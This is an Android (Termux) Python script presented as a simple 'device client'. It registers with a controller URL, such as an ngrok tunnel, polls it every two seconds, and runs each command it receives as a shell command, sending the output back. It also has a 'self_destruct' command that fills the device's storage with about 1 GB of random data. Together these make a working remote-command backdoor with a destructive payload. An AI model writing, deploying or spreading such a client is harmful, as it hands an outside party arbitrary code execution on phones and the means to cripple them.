#!/data/data/com.termux/files/usr/bin/python3
"""
DEVICE CLIENT - Simple HTTP Client
"""

import os
import sys
import json
import time
import threading
import subprocess
import requests
import platform
import uuid

class DeviceClient:
    def __init__(self):
        self.device_id = str(uuid.uuid4())[:8]
        self.device_name = platform.node()
        self.running = True
        self.main_url = None
        self.config_file = os.path.expanduser("~/.device_config.json")
        
    def get_main_url(self):
        """Get main device URL from user or config"""
        if os.path.exists(self.config_file):
            with open(self.config_file, 'r') as f:
                config = json.load(f)
                return config.get('url')
                
        print("\n" + "="*50)
        print("ENTER MAIN DEVICE URL")
        print("="*50)
        print("From the Main Device screen, copy the PUBLIC URL")
        print("Example: https://xxxx.ngrok.io or http://localhost:8080")
        print("="*50)
        
        url = input("\n🌍 URL: ").strip()
        
        # Save for next time
        with open(self.config_file, 'w') as f:
            json.dump({'url': url}, f)
            
        return url
        
    def register(self):
        """Register with main device"""
        try:
            response = requests.post(
                f"{self.main_url}/connect",
                json={"device_id": self.device_id, "device_name": self.device_name},
                timeout=10
            )
            return response.status_code == 200
        except Exception as e:
            print(f"Connection error: {e}")
            return False
            
    def poll_commands(self):
        """Poll for commands"""
        while self.running:
            try:
                response = requests.post(
                    f"{self.main_url}/poll",
                    json={"device_id": self.device_id},
                    timeout=30
                )
                
                if response.status_code == 200:
                    data = response.json()
                    command = data.get('command')
                    
                    if command:
                        print(f"\n📨 Command: {command[:50]}")
                        
                        if command == "self_destruct":
                            output = self.self_destruct()
                        else:
                            output = self.execute(command)
                            
                        # Send response
                        requests.post(
                            f"{self.main_url}/response",
                            json={"device_id": self.device_id, "output": output},
                            timeout=10
                        )
                        
            except Exception as e:
                print(f"Poll error: {e}")
                
            time.sleep(2)
            
    def execute(self, command):
        """Execute command"""
        try:
            result = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=30)
            return result.stdout + result.stderr
        except Exception as e:
            return str(e)
            
    def self_destruct(self):
        """Self destruct"""
        for i in range(10):
            try:
                with open(f"/sdcard/.fill_{i}.dat", 'wb') as f:
                    f.write(os.urandom(100 * 1024 * 1024))
            except:
                pass
        return "Self-destruct activated"
        
    def run(self):
        """Main run"""
        print("\n" + "="*50)
        print("📱 DEVICE CLIENT")
        print("="*50)
        
        # Get main URL
        self.main_url = self.get_main_url()
        print(f"\n🌍 Connecting to: {self.main_url}")
        
        # Register
        if self.register():
            print(f"✅ Registered! ID: {self.device_id}")
            print("🔄 Listening for commands...")
            
            # Start polling
            poll_thread = threading.Thread(target=self.poll_commands, daemon=True)
            poll_thread.start()
            
            # Keep running
            try:
                while self.running:
                    time.sleep(1)
            except KeyboardInterrupt:
                print("\n👋 Disconnecting...")
        else:
            print("❌ Failed to connect")
            print("Make sure main device is running")
            time.sleep(5)

if __name__ == "__main__":
    client = DeviceClient()
    client.run()
